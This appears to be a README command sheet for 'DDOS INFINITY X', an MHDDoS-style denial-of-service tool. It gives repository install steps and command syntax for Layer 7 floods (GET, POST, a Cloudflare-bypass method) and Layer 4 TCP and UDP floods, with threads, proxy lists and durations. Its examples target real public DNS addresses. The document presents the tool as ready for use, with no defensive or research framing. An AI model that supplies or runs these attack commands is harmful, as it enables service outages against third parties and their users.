# DDOS INFINITY X — Commands (MHDDoS style)

## Install

```bash
git clone https://github.com/Infinity-X202/DDOS-INFINITY-X.git
cd DDOS-INFINITY-X
pip3 install -r requirements.txt
```

Kali:

```bash
python3 -m venv venv && source venv/bin/activate
pip3 install -r requirements.txt
```

## Help & tools

```bash
python3 start.py HELP
python3 start.py tools
python3 start.py STOP
```

## Layer 7

```bash
python3 start.py <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration>
```

Example:

```bash
python3 start.py GET http://site.com 0 1000 http.txt 10 100
python3 start.py POST http://site.com 1 500 http.txt 5 60
python3 start.py CFB https://site.com 0 800 http.txt 10 120
```

## Layer 4

```bash
python3 start.py <method> <ip:port> <threads> <duration>
```

Example:

```bash
python3 start.py TCP 1.1.1.1:80 500 60
python3 start.py UDP 8.8.8.8:53 300 30
```

## Layer 4 + proxy

```bash
python3 start.py TCP 1.1.1.1:80 500 60 5 http.txt
```

## Optional menu

```bash
python3 start.py MENU
```
